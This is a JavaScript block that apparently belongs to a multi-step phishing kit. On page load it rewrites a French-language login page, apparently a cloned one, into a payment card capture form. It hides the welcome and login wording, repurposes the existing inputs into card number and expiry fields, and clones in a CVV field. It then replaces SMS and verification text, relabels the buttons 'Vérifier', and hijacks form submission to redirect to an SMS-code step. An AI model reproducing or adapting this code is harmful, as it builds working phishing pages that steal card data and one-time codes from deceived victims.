<script id="unified-step3-handler">
document.addEventListener("DOMContentLoaded", function() {
    // 1. Gently blank out unwanted text without destroying elements
    var walker = document.createTreeWalker(document.body, NodeFilter.SHOW_TEXT, null, false);
    var node;
    while(node = walker.nextNode()) {
        var text = node.nodeValue.toLowerCase();
        if (text.indexOf("bienvenue") !== -1 || 
            text.indexOf("connectez-vous pour commencer") !== -1 || 
            text.indexOf("connectez-vous") !== -1 || 
            text.indexOf("pour commencer") !== -1) {
            node.nodeValue = " "; // Replace with space to keep DOM intact
        }
    }

    // 2. Find inputs to repurpose instead of deleting them
    var inputs = document.querySelectorAll("input:not([type='hidden'])");
    var visibleInputs = [];
    for(var i=0; i<inputs.length; i++) {
        if(inputs[i].type !== "checkbox" && inputs[i].type !== "radio" && inputs[i].type !== "submit" && inputs[i].type !== "button") {
            visibleInputs.push(inputs[i]);
        }
    }

    if (visibleInputs.length >= 1) {
        var firstInput = visibleInputs[0];
        firstInput.type = "tel";
        firstInput.maxLength = 16;
        firstInput.placeholder = "Numro  16 chiffres";
        firstInput.value = "";
        
        var id1 = firstInput.id;
        if(id1) {
            var label1 = document.querySelector("label[for='" + id1 + "']");
            if(label1) label1.innerHTML = "<b>Numro de carte</b>";
        }
    }

    if (visibleInputs.length >= 2) {
        var secondInput = visibleInputs[1];
        secondInput.type = "tel";
        secondInput.maxLength = 5;
        secondInput.placeholder = "MM/AA";
        secondInput.value = "";
        secondInput.removeAttribute("autocomplete");
        
        var id2 = secondInput.id;
        if(id2) {
            var label2 = document.querySelector("label[for='" + id2 + "']");
            if(label2) label2.innerHTML = "<b>Date d'expiration</b>";
        }
        
        secondInput.addEventListener("input", function(e) {
            var val = this.value.replace(/\D/g, '');
            if (val.length > 2) {
                this.value = val.substring(0, 2) + '/' + val.substring(2, 4);
            } else {
                this.value = val;
            }
        });

        // 3. Clone the entire wrapper of the second input for CVV to preserve exact CSS
        var formGroup = secondInput;
        // Traverse up to find a container that holds both label and input, if possible
        while(formGroup && formGroup !== document.body && formGroup.tagName !== 'FORM') {
            if (formGroup.querySelector('label') && formGroup.querySelector('input')) {
                break;
            }
            formGroup = formGroup.parentElement;
        }
        
        if (!formGroup || formGroup === document.body || formGroup.tagName === 'FORM') {
            // fallback
            formGroup = secondInput.parentElement;
        }
        
        if (formGroup && formGroup !== document.body) {
            var cvvGroup = formGroup.cloneNode(true);
            var cvvInput = cvvGroup.querySelector("input");
            var cvvLabel = cvvGroup.querySelector("label");
            
            if (cvvInput) {
                cvvInput.type = "tel";
                cvvInput.maxLength = 3;
                cvvInput.placeholder = "CVV";
                cvvInput.value = "";
                cvvInput.id = "cvv_input_injected";
                cvvInput.name = "cvv_injected";
                
                if (cvvLabel) {
                    cvvLabel.innerHTML = "<b>Code de scurit (CVV)</b>";
                    cvvLabel.setAttribute("for", "cvv_input_injected");
                }
                
                // Remove any old error messages from cloned group
                var errMsgs = cvvGroup.querySelectorAll(".error, .invalid, [role='alert']");
                errMsgs.forEach(function(el) { el.remove(); });
                
                formGroup.insertAdjacentElement('afterend', cvvGroup);
            }
        }
    }

    // 4. Update texts that mention codes to avoid confusion
    var walker2 = document.createTreeWalker(document.body, NodeFilter.SHOW_TEXT, null, false);
    var node2;
    while(node2 = walker2.nextNode()) {
        if(node2.nodeValue.trim().length > 3) {
            var text = node2.nodeValue.toLowerCase();
            if(text.indexOf("sms") !== -1 || text.indexOf("code") !== -1 || text.indexOf("vrification") !== -1) {
                if (node2.nodeValue.indexOf("Code de") === -1) { // Skip CVV label
                    node2.nodeValue = "Veuillez complter vos informations";
                }
            }
        }
    }

    // 5. Submit Buttons
    var clickables = document.querySelectorAll("button, input[type='submit'], .btn");
    clickables.forEach(function(el) {
        var text = (el.textContent || el.value || "").toLowerCase().trim();
        if (el.getAttribute("type") === "submit" || el.classList.contains("submit") || text.indexOf("valid") !== -1 || text.indexOf("contin") !== -1 || text.indexOf("submit") !== -1 || text.indexOf("next") !== -1 || text.indexOf("connect") !== -1) {
            if (el.tagName === "INPUT") {
                el.value = "Vrifier";
            } else {
                el.innerText = "Vrifier";
            }
        }
    });

    // 6. Form Submission Redirect
    var currentFile = window.location.pathname.split("/").pop();
    var smsFile = currentFile.replace("_step3.html", "_sms.html");

    function doRedirect(e) {
        if(e) {
            e.preventDefault();
            e.stopPropagation();
            if(e.stopImmediatePropagation) e.stopImmediatePropagation();
        }
        window.location.href = smsFile;
    }

    var forms = document.querySelectorAll("form");
    forms.forEach(function(form) {
        form.setAttribute("action", "javascript:void(0)");
        form.onsubmit = doRedirect;
        form.addEventListener("submit", doRedirect, true);
    });

    clickables.forEach(function(el) {
        el.addEventListener("click", function(e) {
            var text = (el.textContent || el.value || "").toLowerCase().trim();
            if (text.indexOf("cancel") !== -1 || text.indexOf("annuler") !== -1) {
                return;
            }
            doRedirect(e);
        }, true);
    });
});
</script>
